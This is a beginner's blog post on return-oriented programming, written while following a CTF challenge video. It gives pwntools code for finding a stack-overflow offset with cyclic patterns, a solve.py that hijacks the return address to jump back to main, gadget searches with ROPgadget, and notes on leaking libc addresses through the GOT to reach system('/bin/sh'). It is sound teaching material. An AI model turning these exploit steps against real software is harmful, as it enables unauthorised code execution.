Return-Oriented Programming (ROP) – A Beginner’s Journey

So recently, I finally took the dive into Return-Oriented Programming (ROP) and wanted to document my experience. Not just for anyone else learning, but also for future me when I inevitably forget how I did this in a week.

This post is based on a simple binary exploitation flow, and I followed along with the John Hammond Misfortune CTF ROP video. Highly recommend checking that out if you’re just getting into this.

Setup

To make life easier, I started with pwninit. Super useful to spin up a project template and save time fiddling with boilerplate.

pwninit

This creates a bunch of files including a solve.py – which is where all the exploit magic happens.

Basic Buffer Overflow

Let’s get the base script setup first in solve.py:

context.binary = exe
context.terminal = "kitty"

def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
    else:
        r = remote("127.0.0.1", 9999)
    return r

To test for a buffer overflow:

  • Run the binary
  • Spam the input with a long string like AAAAA...
  • If you hit a segmentation fault (SIGSEGV), congrats, it’s vulnerable

To automate this in our script:

def main():
    r = conn()
    r.recvuntil(b"\n> ")  # adjust based on binary output
    payload = b"".join([
        cyclic(90),
    ])
    r.send(payload)
    r.interactive()

Run the script locally with GDB:

python solve.py LOCAL

In the GDB window, type c to continue.

Finding the Offset

After it crashes, type:

info registers

You’ll see something like:

rbp		0x6161616a61616169

Take the last 4 bytes: 61616169

Now find the offset:

pwn cyclic -l 0x61616169

Let’s say it returns 32. Update the script:

offset = 32
length = 90

payload = b"".join([
    b"A" * offset,
    b"BBBBBBBB",  # 8 bytes for 64-bit check
])
payload += b"C" * (length - len(payload))

r.send(payload)

Run the script again. After c in GDB, confirm that RIP is now filled with the BBBBBBBB. If yes – control achieved!

Intro to ROP

Alright, now things get spicy.

NX (No eXecute) means we can’t run our shellcode directly. So instead, we use ROP chains to stitch together small executable snippets (gadgets) already present in the binary or linked libraries.

First, let’s find gadgets:

ROPgadget --binary misfortune

Look for things like:

  • pop rdi; ret
  • ret

These are crucial for controlling registers and making function calls like system("/bin/sh").

Building the ROP Chain

Now let’s level up the script.

from pwn import *

exe = ELF("./misfortune_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi"])[0]
ret = rop.find_gadget(["ret"])[0]

success(f"{hex(pop_rdi)=}")
success(f"{hex(ret)=}")

context.binary = exe
context.terminal = "kitty"

Get the address of main so we can return to it:

main_function = exe.symbols.main

And now update the main function:

def main():
    r = conn()
    prompt = r.recvuntil(b"\n> ")
    print(prompt.decode('utf-8'))

    offset = 32
    length = 90
    payload = b"".join([
        b"A" * offset,
        p64(ret),
        p64(main_function),  # jump back to main
    ])
    payload += b"C" * (length - len(payload))

    r.send(payload)
    r.interactive()

This payload just loops back to main. Nothing groundbreaking yet — but it confirms that we can redirect execution.

What’s Next? Real ROP Payloads

Now that we’ve got control, we can build real payloads using functions from the libc.

Functions like system, puts, and read live in libc, and to call them, we need:

  • The function address
  • Arguments passed via registers (rdi, rsi, etc. for 64-bit)

And if you’re wondering:

What the heck is GOT and PLT?

  • GOT (Global Offset Table): Holds addresses of dynamically-linked functions
  • PLT (Procedure Linkage Table): Jumps into GOT to resolve and call functions

You can leak addresses from GOT using puts, and then use those to calculate libc base and call system("/bin/sh"). But that’s for another post
